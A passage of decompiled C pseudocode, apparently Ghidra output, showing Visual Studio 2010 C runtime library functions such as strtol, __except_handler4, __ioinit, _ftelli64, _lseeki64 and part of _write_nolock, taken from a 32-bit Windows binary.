    if ((uVar1 & 4) == 0) {
      if ((uVar1 & 0x103) == 0) {
LAB_003b7fce:
        pbVar9 = pbVar9 + -1;
        if ((param_5 & 8U) == 0) {
          if (param_3 != (char **)0x0) {
            pbVar9 = (byte *)param_2;
          }
          local_8 = 0;
        }
        else {
          if (((param_5 & 4U) != 0) ||
             (((param_5 & 1U) == 0 &&
              ((((param_5 & 2U) != 0 && (0x80000000 < local_8)) ||
               (((param_5 & 2U) == 0 && (0x7fffffff < local_8)))))))) {
            piVar3 = __errno();
            *piVar3 = 0x22;
            if ((param_5 & 1U) == 0) {
              local_8 = ((param_5 & 2U) != 0) + 0x7fffffff;
            }
            else {
              local_8 = 0xffffffff;
            }
          }
        }
        if (param_3 != (char **)0x0) {
          *param_3 = (char *)pbVar9;
        }
        if ((param_5 & 2U) != 0) {
          local_8 = -local_8;
        }
        if (local_14 == '\0') {
          return local_8;
        }
        *(uint *)(local_18 + 0x70) = *(uint *)(local_18 + 0x70) & 0xfffffffd;
        return local_8;
      }
      iVar7 = (int)(char)bVar8;
      if ((byte)(bVar8 + 0x9f) < 0x1a) {
        iVar7 = iVar7 + -0x20;
      }
      uVar6 = iVar7 - 0x37;
    }
    else {
      uVar6 = (int)(char)bVar8 - 0x30;
    }
    if ((uint)param_4 <= uVar6) goto LAB_003b7fce;
    if ((local_8 < uVar4) || ((local_8 == uVar4 && (uVar6 <= local_c)))) {
      local_8 = local_8 * param_4 + uVar6;
      param_5 = param_5 | 8;
    }
    else {
      param_5 = param_5 | 0xc;
      if (param_3 == (char **)0x0) goto LAB_003b7fce;
    }
    bVar8 = *pbVar9;
    pbVar9 = pbVar9 + 1;
  } while( true );
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _strtol
// 
// Library: Visual Studio 2010 Release

long __cdecl _strtol(char *_Str,char **_EndPtr,int _Radix)

{
  unsigned_long uVar1;
  undefined **ppuVar2;
  
  if (_DAT_003d7cf8 == 0) {
    ppuVar2 = &PTR_DAT_003d6de4;
  }
  else {
    ppuVar2 = (undefined **)0x0;
  }
  uVar1 = strtoxl((localeinfo_struct *)ppuVar2,_Str,_EndPtr,_Radix,0);
  return uVar1;
}



// Library Function - Single Match
//  __msize
// 
// Library: Visual Studio 2010 Release

size_t __cdecl __msize(void *_Memory)

{
  int *piVar1;
  size_t sVar2;
  
  if (_Memory == (void *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return 0xffffffff;
  }
  sVar2 = HeapSize(hHeap_003d802c,0,_Memory);
  return sVar2;
}



// WARNING: This is an inlined function
// WARNING: Unable to track spacebase fully for stack
// WARNING: Variable defined which should be unmapped: param_2
// Library Function - Single Match
//  __SEH_prolog4
// 
// Library: Visual Studio

void __cdecl __SEH_prolog4(undefined4 param_1,int param_2)

{
  int iVar1;
  undefined4 unaff_EBX;
  undefined4 unaff_ESI;
  undefined4 unaff_EDI;
  int *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  uint auStack28 [5];
  undefined local_8 [8];
  
  iVar1 = -param_2;
  *(undefined4 *)((int)auStack28 + iVar1 + 0x10) = unaff_EBX;
  *(undefined4 *)((int)auStack28 + iVar1 + 0xc) = unaff_ESI;
  *(undefined4 *)((int)auStack28 + iVar1 + 8) = unaff_EDI;
  *(uint *)((int)auStack28 + iVar1 + 4) = DAT_003d6664 ^ (uint)&param_2;
  *(undefined4 *)((int)auStack28 + iVar1) = unaff_retaddr;
  *in_FS_OFFSET = (int)local_8;
  return;
}



// WARNING: This is an inlined function
// Library Function - Single Match
//  __SEH_epilog4
// 
// Library: Visual Studio

void __SEH_epilog4(void)

{
  undefined4 *unaff_EBP;
  undefined4 *in_FS_OFFSET;
  undefined4 unaff_retaddr;
  
  *in_FS_OFFSET = unaff_EBP[-4];
  *unaff_EBP = unaff_retaddr;
  return;
}



// Library Function - Single Match
//  __except_handler4
// 
// Library: Visual Studio 2010 Release

PVOID __fastcall
__except_handler4(undefined4 param_1,undefined4 param_2,PEXCEPTION_RECORD param_3,PVOID param_4,
                 DWORD param_5)

{
  int iVar1;
  BOOL BVar2;
  undefined4 extraout_EDX;
  PEXCEPTION_RECORD pEVar3;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 uVar4;
  PEXCEPTION_RECORD extraout_EDX_02;
  PVOID pvVar5;
  int *piVar6;
  undefined4 unaff_EDI;
  undefined8 uVar7;
  undefined uVar8;
  PEXCEPTION_RECORD local_1c;
  DWORD local_18;
  _EXCEPTION_RECORD *local_14;
  PVOID local_10;
  PVOID local_c;
  char local_5;
  
  piVar6 = (int *)(*(uint *)((int)param_4 + 8) ^ DAT_003d6664);
  local_5 = '\0';
  local_10 = (PVOID)0x1;
  iVar1 = (int)param_4 + 0x10;
  if (*piVar6 != -2) {
    terminate_if_debugger_present
              (piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),param_2,(char)unaff_EDI);
    param_2 = extraout_EDX;
  }
  terminate_if_debugger_present
            (piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),param_2,(char)unaff_EDI);
  uVar8 = (undefined)unaff_EDI;
  pvVar5 = param_4;
  if ((*(byte *)&param_3->ExceptionFlags & 0x66) == 0) {
    pEVar3 = (PEXCEPTION_RECORD)&local_1c;
    *(PEXCEPTION_RECORD *)((int)param_4 + -4) = pEVar3;
    pvVar5 = *(PVOID *)((int)param_4 + 0xc);
    local_1c = param_3;
    local_18 = param_5;
    if (pvVar5 == (PVOID)0xfffffffe) {
      return local_10;
    }
    do {
      local_14 = (_EXCEPTION_RECORD *)(piVar6 + (int)pvVar5 * 3 + 4);
      local_c = (PVOID)local_14->ExceptionCode;
      if ((undefined *)piVar6[(int)pvVar5 * 3 + 5] != (undefined *)0x0) {
        uVar7 = __EH4_CallFilterFunc_8((undefined *)piVar6[(int)pvVar5 * 3 + 5]);
        pEVar3 = (PEXCEPTION_RECORD)((ulonglong)uVar7 >> 0x20);
        uVar8 = (undefined)unaff_EDI;
        local_5 = '\x01';
        if ((int)uVar7 < 0) {
          local_10 = (PVOID)0x0;
          goto LAB_003b81e8;
        }
        if (0 < (int)uVar7) {
          if ((param_3->ExceptionCode == 0xe06d7363) &&
             (BVar2 = __IsNonwritableInCurrentImage((PBYTE)&PTR____DestructExceptionObject_003c7298)
             , BVar2 != 0)) {
            ___DestructExceptionObject((int *)param_3);
          }
          __EH4_GlobalUnwind2_8(param_4,param_3);
          uVar4 = extraout_EDX_00;
          if (*(PVOID *)((int)param_4 + 0xc) != pvVar5) {
            __EH4_LocalUnwind_16((int)param_4,(uint)pvVar5,iVar1,&DAT_003d6664);
            uVar4 = extraout_EDX_01;
          }
          *(PVOID *)((int)param_4 + 0xc) = local_c;
          if (*piVar6 != -2) {
            terminate_if_debugger_present
                      (piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),uVar4,uVar8);
          }
          terminate_if_debugger_present
                    (piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),piVar6[2],uVar8);
          __EH4_TransferToHandler_8((undefined *)local_14->ExceptionRecord);
          goto LAB_003b82af;
        }
      }
      uVar8 = (undefined)unaff_EDI;
      pvVar5 = local_c;
    } while (local_c != (PVOID)0xfffffffe);
    if (local_5 == '\0') {
      return local_10;
    }
  }
  else {
LAB_003b82af:
    if (*(int *)((int)pvVar5 + 0xc) == -2) {
      return local_10;
    }
    __EH4_LocalUnwind_16((int)pvVar5,0xfffffffe,iVar1,&DAT_003d6664);
    pEVar3 = extraout_EDX_02;
  }
LAB_003b81e8:
  if (*piVar6 != -2) {
    terminate_if_debugger_present(piVar6[1] + iVar1 ^ *(uint *)(*piVar6 + iVar1),pEVar3,uVar8);
  }
  terminate_if_debugger_present(piVar6[3] + iVar1 ^ *(uint *)(piVar6[2] + iVar1),piVar6[2],uVar8);
  return local_10;
}



// Library Function - Single Match
//  __ioinit
// 
// Library: Visual Studio 2010 Release

int __cdecl __ioinit(void)

{
  void *pvVar1;
  int iVar2;
  DWORD DVar3;
  BOOL BVar4;
  HANDLE pvVar5;
  UINT UVar6;
  UINT UVar7;
  HANDLE *ppvVar8;
  void **ppvVar9;
  uint uVar10;
  _STARTUPINFOW local_50;
  HANDLE *local_c;
  UINT *local_8;
  
  GetStartupInfoW((LPSTARTUPINFOW)&local_50);
  pvVar1 = __calloc_crt(0x20,0x40);
  if (pvVar1 == (void *)0x0) {
    iVar2 = -1;
  }
  else {
    uNumber_003ea048 = 0x20;
    DAT_003ea060 = pvVar1;
    if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
      iVar2 = (int)pvVar1 + 5;
      do {
        *(undefined4 *)(iVar2 + -5) = 0xffffffff;
        *(undefined2 *)(iVar2 + -1) = 0xa00;
        *(undefined4 *)(iVar2 + 3) = 0;
        *(undefined2 *)(iVar2 + 0x1f) = 0xa00;
        *(undefined *)(iVar2 + 0x21) = 10;
        *(undefined4 *)(iVar2 + 0x33) = 0;
        *(undefined *)(iVar2 + 0x2f) = 0;
        uVar10 = iVar2 + 0x3b;
        iVar2 = iVar2 + 0x40;
      } while (uVar10 < (int)DAT_003ea060 + 0x800U);
    }
    if ((local_50.cbReserved2 != 0) && ((UINT *)local_50.lpReserved2 != (UINT *)0x0)) {
      UVar6 = *(UINT *)local_50.lpReserved2;
      local_8 = (UINT *)((int)local_50.lpReserved2 + 4);
      local_c = (HANDLE *)((int)local_8 + UVar6);
      if (0x7ff < (int)UVar6) {
        UVar6 = 0x800;
      }
      UVar7 = UVar6;
      if ((int)uNumber_003ea048 < (int)UVar6) {
        ppvVar9 = (void **)&DAT_003ea064;
        do {
          pvVar1 = __calloc_crt(0x20,0x40);
          UVar7 = uNumber_003ea048;
          if (pvVar1 == (void *)0x0) break;
          uNumber_003ea048 = uNumber_003ea048 + 0x20;
          *ppvVar9 = pvVar1;
          if (pvVar1 < (void *)((int)pvVar1 + 0x800U)) {
            iVar2 = (int)pvVar1 + 5;
            do {
              *(undefined4 *)(iVar2 + -5) = 0xffffffff;
              *(undefined4 *)(iVar2 + 3) = 0;
              *(byte *)(iVar2 + 0x1f) = *(byte *)(iVar2 + 0x1f) & 0x80;
              *(undefined4 *)(iVar2 + 0x33) = 0;
              *(undefined2 *)(iVar2 + -1) = 0xa00;
              *(undefined2 *)(iVar2 + 0x20) = 0xa0a;
              *(undefined *)(iVar2 + 0x2f) = 0;
              uVar10 = iVar2 + 0x3b;
              iVar2 = iVar2 + 0x40;
            } while (uVar10 < (int)*ppvVar9 + 0x800U);
          }
          ppvVar9 = ppvVar9 + 1;
          UVar7 = UVar6;
        } while ((int)uNumber_003ea048 < (int)UVar6);
      }
      uVar10 = 0;
      if (0 < (int)UVar7) {
        do {
          pvVar5 = *local_c;
          if ((((pvVar5 != (HANDLE)0xffffffff) && (pvVar5 != (HANDLE)0xfffffffe)) &&
              ((*(byte *)local_8 & 1) != 0)) &&
             (((*(byte *)local_8 & 8) != 0 || (DVar3 = GetFileType(pvVar5), DVar3 != 0)))) {
            ppvVar8 = (HANDLE *)((uVar10 & 0x1f) * 0x40 + (int)(&DAT_003ea060)[(int)uVar10 >> 5]);
            *ppvVar8 = *local_c;
            *(byte *)(ppvVar8 + 1) = *(byte *)local_8;
            BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
            if (BVar4 == 0) {
              return -1;
            }
            ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
          }
          local_c = local_c + 1;
          uVar10 = uVar10 + 1;
          local_8 = (UINT *)((int)local_8 + 1);
        } while ((int)uVar10 < (int)UVar7);
      }
    }
    iVar2 = 0;
    do {
      ppvVar8 = (HANDLE *)(iVar2 * 0x40 + (int)DAT_003ea060);
      if ((*ppvVar8 == (HANDLE)0xffffffff) || (*ppvVar8 == (HANDLE)0xfffffffe)) {
        *(undefined *)(ppvVar8 + 1) = 0x81;
        if (iVar2 == 0) {
          DVar3 = 0xfffffff6;
        }
        else {
          DVar3 = 0xfffffff5 - (iVar2 != 1);
        }
        pvVar5 = GetStdHandle(DVar3);
        if (((pvVar5 == (HANDLE)0xffffffff) || (pvVar5 == (HANDLE)0x0)) ||
           (DVar3 = GetFileType(pvVar5), DVar3 == 0)) {
          *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          *ppvVar8 = (HANDLE)0xfffffffe;
        }
        else {
          *ppvVar8 = pvVar5;
          if ((DVar3 & 0xff) == 2) {
            *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x40;
          }
          else {
            if ((DVar3 & 0xff) == 3) {
              *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 8;
            }
          }
          BVar4 = InitializeCriticalSectionAndSpinCount((LPCRITICAL_SECTION)(ppvVar8 + 3),4000);
          if (BVar4 == 0) {
            return -1;
          }
          ppvVar8[2] = (HANDLE)((int)ppvVar8[2] + 1);
        }
      }
      else {
        *(byte *)(ppvVar8 + 1) = *(byte *)(ppvVar8 + 1) | 0x80;
      }
      iVar2 = iVar2 + 1;
    } while (iVar2 < 3);
    SetHandleCount(uNumber_003ea048);
    iVar2 = 0;
  }
  return iVar2;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2010 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    return -1;
  }
  return _File->_file;
}



// Library Function - Single Match
//  __mtinitlocks
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocks(void)

{
  BOOL BVar1;
  int iVar2;
  LPCRITICAL_SECTION p_Var3;
  
  iVar2 = 0;
  p_Var3 = (LPCRITICAL_SECTION)&DAT_003d86c8;
  do {
    if ((&DAT_003d6e44)[iVar2 * 2] == 1) {
      (&lpCriticalSection_003d6e40)[iVar2 * 2] = p_Var3;
      p_Var3 = p_Var3 + 1;
      BVar1 = InitializeCriticalSectionAndSpinCount((&lpCriticalSection_003d6e40)[iVar2 * 2],4000);
      if (BVar1 == 0) {
        (&lpCriticalSection_003d6e40)[iVar2 * 2] = (LPCRITICAL_SECTION)0x0;
        return 0;
      }
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 0x24);
  return 1;
}



void __cdecl FUN_003b8677(int param_1)

{
  LeaveCriticalSection((&lpCriticalSection_003d6e40)[param_1 * 2]);
  return;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __mtinitlocknum
// 
// Library: Visual Studio 2010 Release

int __cdecl __mtinitlocknum(int _LockNum)

{
  LPCRITICAL_SECTION *pp_Var1;
  LPCRITICAL_SECTION lpCriticalSection;
  int *piVar2;
  BOOL BVar3;
  int iVar4;
  int local_20;
  
  iVar4 = 1;
  local_20 = 1;
  if (hHeap_003d802c == (HANDLE)0x0) {
    __FF_MSGBANNER();
    __NMSG_WRITE(0x1e);
    FUN_003b5906(0xff);
  }
  pp_Var1 = &lpCriticalSection_003d6e40 + _LockNum * 2;
  if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
    lpCriticalSection = (LPCRITICAL_SECTION)__malloc_crt(0x18);
    if (lpCriticalSection == (LPCRITICAL_SECTION)0x0) {
      piVar2 = __errno();
      *piVar2 = 0xc;
      iVar4 = 0;
    }
    else {
      __lock(10);
      if (*pp_Var1 == (LPCRITICAL_SECTION)0x0) {
        BVar3 = InitializeCriticalSectionAndSpinCount(lpCriticalSection,4000);
        if (BVar3 == 0) {
          _free(lpCriticalSection);
          piVar2 = __errno();
          *piVar2 = 0xc;
          local_20 = 0;
        }
        else {
          *pp_Var1 = lpCriticalSection;
        }
      }
      else {
        _free(lpCriticalSection);
      }
      FUN_003b8747();
      iVar4 = local_20;
    }
  }
  return iVar4;
}



void FUN_003b8747(void)

{
  FUN_003b8677(10);
  return;
}



// Library Function - Single Match
//  __lock
// 
// Library: Visual Studio 2010 Release

void __cdecl __lock(int _File)

{
  int iVar1;
  
  if ((&lpCriticalSection_003d6e40)[_File * 2] == (LPCRITICAL_SECTION)0x0) {
    iVar1 = __mtinitlocknum(_File);
    if (iVar1 == 0) {
      __amsg_exit(0x11);
    }
  }
  EnterCriticalSection((&lpCriticalSection_003d6e40)[_File * 2]);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  __getbuf
// 
// Library: Visual Studio 2010 Release

void __cdecl __getbuf(FILE *_File)

{
  char *pcVar1;
  
  _DAT_003d7ce0 = _DAT_003d7ce0 + 1;
  pcVar1 = (char *)__malloc_crt(0x1000);
  _File->_base = pcVar1;
  if (pcVar1 == (char *)0x0) {
    _File->_flag = _File->_flag | 4;
    _File->_base = (char *)&_File->_charbuf;
    _File->_bufsiz = 2;
  }
  else {
    _File->_flag = _File->_flag | 8;
    _File->_bufsiz = 0x1000;
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// Library Function - Single Match
//  __ftelli64_nolock
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __ftelli64_nolock(FILE *_File)

{
  uint uVar1;
  char *pcVar2;
  int iVar3;
  BOOL BVar4;
  byte *pbVar5;
  int *piVar6;
  char *pcVar7;
  uint uVar8;
  int iVar9;
  char *pcVar10;
  uint uVar11;
  int iVar12;
  char *pcVar13;
  bool bVar14;
  longlong lVar15;
  longlong lVar16;
  uint in_stack_ffffefdc;
  uint local_1018;
  int local_1014;
  uint local_1010;
  byte local_1009 [4097];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar1 = __fileno(_File);
  if (_File->_cnt < 0) {
    _File->_cnt = 0;
  }
  lVar15 = __lseeki64(uVar1,0,1);
  uVar8 = (uint)((ulonglong)lVar15 >> 0x20);
  pcVar2 = (char *)lVar15;
  if ((uVar8 == 0 || lVar15 < 0) && (lVar15 < 0)) goto LAB_003b8829;
  piVar6 = &DAT_003ea060 + ((int)uVar1 >> 5);
  iVar12 = (uVar1 & 0x1f) * 0x40;
  iVar3 = *piVar6 + iVar12;
  local_1009[0] = (char)(*(char *)(iVar3 + 0x24) * '\x02') >> 1;
  if ((_File->_flag & 0x108U) == 0) {
    uVar11 = (uVar8 - ((int)(char *)_File->_cnt >> 0x1f)) - (uint)(pcVar2 < (char *)_File->_cnt);
    goto LAB_003b8b07;
  }
  pcVar13 = _File->_ptr;
  local_1010 = (int)pcVar13 - (int)_File->_base;
  if ((_File->_flag & 3U) == 0) {
    if ((char)_File->_flag < '\0') goto LAB_003b89d7;
    piVar6 = __errno();
    *piVar6 = 0x16;
  }
  else {
    if ((local_1009[0] != 1) || (*(int *)(iVar3 + 0x30) == 0)) {
      if ((*(byte *)(iVar3 + 4) & 0x80) != 0) {
        for (pcVar10 = _File->_base; pcVar10 < pcVar13; pcVar10 = pcVar10 + 1) {
          if (*pcVar10 == '\n') {
            local_1010 = local_1010 + 1;
          }
        }
      }
LAB_003b89d7:
      uVar11 = (uint)pcVar2 | uVar8;
      if (lVar15 == 0) goto LAB_003b8b07;
      if ((*(byte *)&_File->_flag & 1) != 0) {
        if (_File->_cnt == 0) {
          local_1010 = 0;
        }
        else {
          pcVar13 = pcVar13 + (_File->_cnt - (int)_File->_base);
          if ((*(byte *)(iVar3 + 4) & 0x80) != 0) {
            lVar16 = __lseeki64(uVar1,0,2);
            if (lVar15 == lVar16) {
              pcVar7 = _File->_base;
              pcVar10 = pcVar7 + (int)pcVar13;
              for (; pcVar7 < pcVar10; pcVar7 = pcVar7 + 1) {
                if (*pcVar7 == '\n') {
                  pcVar13 = pcVar13 + 1;
                }
              }
              bVar14 = (_File->_flag & 0x2000U) == 0;
            }
            else {
              lVar15 = __lseeki64(uVar1,lVar15,0);
              if (((int)((ulonglong)lVar15 >> 0x20) == 0 || lVar15 < 0) && (lVar15 < 0))
              goto LAB_003b8829;
              if (((char *)0x200 < pcVar13) ||
                 (((_File->_flag & 8U) == 0 ||
                  (pcVar13 = (char *)0x200, (_File->_flag & 0x400U) != 0)))) {
                pcVar13 = (char *)_File->_bufsiz;
              }
              bVar14 = (*(byte *)(*piVar6 + 4 + iVar12) & 4) == 0;
            }
            if (!bVar14) {
              pcVar13 = pcVar13 + 1;
            }
          }
          if (local_1009[0] == 1) {
            pcVar13 = (char *)((uint)pcVar13 >> 1);
          }
          lVar15 = CONCAT44(uVar8 - (pcVar2 < pcVar13),(int)pcVar2 - (int)pcVar13);
        }
      }
      local_1014 = (int)((ulonglong)lVar15 >> 0x20);
      local_1018 = (uint)lVar15;
      if (local_1009[0] == 1) {
        local_1010 = local_1010 >> 1;
      }
      uVar11 = local_1014 + (uint)CARRY4(local_1010,local_1018);
      goto LAB_003b8b07;
    }
    in_stack_ffffefdc = local_1010 >> 1;
    uVar11 = uVar8;
    if (_File->_cnt == 0) goto LAB_003b8b07;
    lVar16 = __lseeki64(uVar1,*(longlong *)(iVar3 + 0x28),0);
    iVar9 = (int)((ulonglong)lVar16 >> 0x20);
    iVar3 = *piVar6;
    if ((((uint)lVar16 == *(uint *)(iVar3 + 0x28 + iVar12)) &&
        (iVar9 == *(int *)(iVar3 + 0x2c + iVar12))) &&
       (BVar4 = ReadFile(*(HANDLE *)(iVar3 + iVar12),local_1009 + 1,0x1000,&local_1010,
                         (LPOVERLAPPED)0x0), BVar4 != 0)) {
      lVar15 = __lseeki64(uVar1,lVar15,0);
      if ((((int)((ulonglong)lVar15 >> 0x20) != 0 && -1 < lVar15) || (-1 < lVar15)) &&
         (in_stack_ffffefdc <= local_1010)) {
        pbVar5 = local_1009 + 1;
        if (in_stack_ffffefdc != 0) {
          uVar1 = in_stack_ffffefdc;
          do {
            uVar1 = uVar1 - 1;
            if (local_1009 + local_1010 + 1 <= pbVar5) break;
            if (*pbVar5 == 0xd) {
              if ((pbVar5 < local_1009 + local_1010) && (pbVar5[1] == 10)) {
                pbVar5 = pbVar5 + 1;
              }
            }
            else {
              pbVar5 = pbVar5 + (char)(&DAT_003d7100)[*pbVar5];
            }
            pbVar5 = pbVar5 + 1;
          } while (uVar1 != 0);
        }
        uVar11 = iVar9 + (uint)CARRY4((int)pbVar5 - (int)(local_1009 + 1),(uint)lVar16);
        goto LAB_003b8b07;
      }
    }
  }
LAB_003b8829:
  uVar11 = 0xffffffff;
LAB_003b8b07:
  lVar15 = terminate_if_debugger_present
                     (local_8 ^ (uint)&stack0xfffffffc,uVar11,(char)in_stack_ffffefdc);
  return lVar15;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __ftelli64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __ftelli64(FILE *_File)

{
  int *piVar1;
  longlong lVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    FUN_003b60f9();
    lVar2 = -1;
  }
  else {
    __lock_file(_File);
    lVar2 = __ftelli64_nolock(_File);
    FUN_003b8b79();
  }
  return lVar2;
}



void FUN_003b8b79(void)

{
  int unaff_EBP;
  
  __unlock_file(*(FILE **)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __lseeki64_nolock
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64_nolock(int _FileHandle,longlong _Offset,int _Origin)

{
  byte *pbVar1;
  HANDLE hFile;
  int *piVar2;
  DWORD DVar3;
  DWORD DVar4;
  LONG local_8;
  
  local_8 = _Offset._4_4_;
  hFile = (HANDLE)__get_osfhandle(_FileHandle);
  if (hFile == (HANDLE)0xffffffff) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_003b8bb4:
    DVar3 = 0xffffffff;
    local_8 = -1;
  }
  else {
    DVar3 = SetFilePointer(hFile,(LONG)_Offset,&local_8,_Origin);
    if (DVar3 == 0xffffffff) {
      DVar4 = GetLastError();
      if (DVar4 != 0) {
        __dosmaperr(DVar4);
        goto LAB_003b8bb4;
      }
    }
    pbVar1 = (byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40);
    *pbVar1 = *pbVar1 & 0xfd;
  }
  return CONCAT44(local_8,DVar3);
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __lseeki64
// 
// Library: Visual Studio 2010 Release

longlong __cdecl __lseeki64(int _FileHandle,longlong _Offset,int _Origin)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  longlong lVar4;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < uNumber_003ea048)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_003ea060)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          lVar4 = -1;
        }
        else {
          lVar4 = __lseeki64_nolock(_FileHandle,_Offset,_Origin);
        }
        FUN_003b8ce8();
        return lVar4;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    FUN_003b60f9();
  }
  return -1;
}



void FUN_003b8ce8(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Could not reconcile some variable overlaps
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2010 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  byte bVar1;
  ushort uVar2;
  wchar_t *pwVar3;
  wint_t wVar4;
  ulong *puVar5;
  int *piVar6;
  int iVar7;
  _ptiddata p_Var8;
  BOOL BVar9;
  DWORD nNumberOfBytesToWrite;
  ushort *puVar10;
  int iVar11;
  uint uVar12;
  uint in_EDX;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint extraout_EDX_01;
  uint extraout_EDX_02;
  uint extraout_EDX_03;
  uint extraout_EDX_04;
  uint extraout_EDX_05;
  uint extraout_EDX_06;
  uint extraout_EDX_07;
  uint extraout_EDX_08;
  uint extraout_EDX_09;
  uint extraout_EDX_10;
  uint extraout_EDX_11;
  uint extraout_EDX_12;
  uint extraout_EDX_13;
  uint extraout_EDX_14;
  uint extraout_EDX_15;
  uint extraout_EDX_16;
  uint extraout_EDX_17;
  uint extraout_EDX_18;
  uint extraout_EDX_19;
  uint extraout_EDX_20;
  ushort *puVar13;
  uint uVar14;
  int iVar15;
  size_t _SrcSizeInBytes;
  uint in_stack_ffffe518;
  ushort *local_1ae4;
  int *local_1ae0;
  uint local_1adc;
  ushort *local_1ad8;
  int local_1ad4;
  ushort *local_1ad0;
  uint local_1acc;
  char local_1ac5;
  uint local_1ac4;
  DWORD local_1ac0;
  ushort local_1abc [852];
  CHAR local_1414 [3416];
  ushort local_6bc [854];
  undefined local_10;
  byte local_f;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (ushort *)_Buf;
  local_1acc = 0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_003b93e1;
  if (_Buf == (void *)0x0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_003b60f9();
    in_EDX = extraout_EDX;
    goto LAB_003b93e1;
  }
  piVar6 = &DAT_003ea060 + (_FileHandle >> 5);
  iVar11 = (_FileHandle & 0x1fU) * 0x40;
  local_1ac5 = (char)(*(char *)(*piVar6 + 0x24 + iVar11) * '\x02') >> 1;
  local_1ae0 = piVar6;
  if (((local_1ac5 == '\x02') || (local_1ac5 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 0x16;
    FUN_003b60f9();
    in_EDX = extraout_EDX_00;
    goto LAB_003b93e1;
  }
  if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0,2);
  }
  iVar7 = __isatty(_FileHandle);
  in_EDX = extraout_EDX_01;
  if ((iVar7 == 0) || ((*(byte *)(iVar11 + 4 + *piVar6) & 0x80) == 0)) {
LAB_003b9072:
    if ((*(byte *)(*piVar6 + 4 + iVar11) & 0x80) == 0) {
      BVar9 = WriteFile(*(HANDLE *)(*piVar6 + iVar11),local_1ad0,_MaxCharCount,&local_1adc,
                        (LPOVERLAPPED)0x0);
      if (BVar9 == 0) {
LAB_003b9353:
        local_1ac0 = GetLastError();
        in_EDX = extraout_EDX_17;
      }
      else {
        local_1ac0 = 0;
        local_1acc = local_1adc;
        in_EDX = extraout_EDX_16;
      }
LAB_003b935f:
      if (local_1acc != 0) goto LAB_003b93e1;
      goto LAB_003b9368;
    }
    local_1ac0 = 0;
    if (local_1ac5 == '\0') {
      puVar13 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_003b939e;
      do {
        uVar14 = 0;
        uVar12 = (int)puVar13 - (int)local_1ad0;
        puVar10 = local_1abc;
        do {
          if (_MaxCharCount <= uVar12) break;
